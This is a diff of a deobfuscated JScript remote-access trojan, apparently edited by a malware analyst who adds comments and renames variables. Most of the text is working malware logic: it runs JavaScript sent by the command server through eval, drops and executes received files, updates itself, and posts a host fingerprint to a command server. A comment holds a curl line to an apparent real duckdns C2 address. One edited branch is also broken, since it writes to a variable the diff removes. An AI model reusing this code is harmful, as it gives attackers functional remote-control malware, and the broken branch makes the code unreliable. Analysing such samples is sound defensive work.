@@ -55,7 +55,7 @@ do {
 	}
 
 	// Modifies the HDDSerial Prefix
-	// Maybe to invalidate the user agent ?
+	// Maybe to invalidate the user agent and deliver different payloads on each contact ?
 	if (Response[0] === "Rn") {
 	    // Opens the script file for reading
 	    var scriptr = FileSystem.OpenTextFile(ScriptFullName,1); // ri
@@ -73,6 +73,7 @@ do {
 
 
 	// Allow to run a new script, with the ability to contact the C2
+	// maybe a way to update itself
 	if (Response[0] === "Up") {
 	    var pathTemp = GetEnvironementVar("temp") + "\\" + Response[2]; // s2
 	    var file = FileSystem.CreateTextFile(pathTemp,true); // ctf
@@ -85,21 +86,24 @@ do {
 	    WScript.Quit(1);
 	}
 
+	// Get javascript from C2 and executes it. Looking at the parameters, it's hard to determine
+	// what this should be doing.
 	if (Response[0] === "Un") {
-	    var s2 = Response[1];
+	    var formatString = Response[1]; // s2
 	    var scriptPathTemp = GetEnvironementVar("Temp") + BackSlash + ScriptName;
 	    var regi = "URCWXKQC01";
-	    s2 = s2.replace("%f",ScriptFullName).replace("%n",ScriptName).replace("%sfdr",scriptPathTemp).replace("%RgNe%",regi);
-	    eval(s2);
+	    formatString = formatString.replace("%f",ScriptFullName).replace("%n",ScriptName).replace("%sfdr",scriptPathTemp).replace("%RgNe%",regi);
+	    eval(formatString);
 	    WScript.Quit(1);
 	}
 
+	// drop and execute file
 	if (Response[0] === "RF") {
-	    var s2 = GetEnvironementVar("temp") + "\\" + Response[2];
-	    var fi = FileSystem.CreateTextFile(s2,true);
-	    fi.Write(Response[1]);
-	    fi.Close();
-	    shell.run(s2);
+	    var pathTemp = GetEnvironementVar("temp") + "\\" + Response[2]; //s2
+	    var file = FileSystem.CreateTextFile(s2,true); //fi
+	    file.Write(Response[1]);
+	    file.Close();
+	    shell.run(pathTemp);
 	}
    } catch(err) {
    }
@@ -113,7 +117,7 @@ function GetEnvironementVar(VariableName) {
 }
 function PostFingerPrint(ressource,body) {
     // x = ReturnWindowsTool('XMLHTTP');
-    // curl -A 'windows_0AEFADF6\DESKTOP-V3RVKO3\test\Microsoft Windows 10 Enterprise Evaluation\Windows Defender\\NO\TRUE\' --data ''  http://postventa-vodafone2006.duckdns.org:1993/Vre
+    // curl -A 'windows_0AEFADF6\DESKTOP-V3RVKO3\test\Microsoft Windows 10 Enterprise Evaluation\Windows Defender\\NO\TRUE\' --data ''  http://postventa-vodafone2006.duckdns.org:1993/VreVre
     var X = ReturnWindowsTool(3);
     // url is supposed to be "http://postventa-vodafone2006.duckdns.org:1993/"
     X.open('POST','http://192.168.1.7:1993/Vre' + ressource, false);
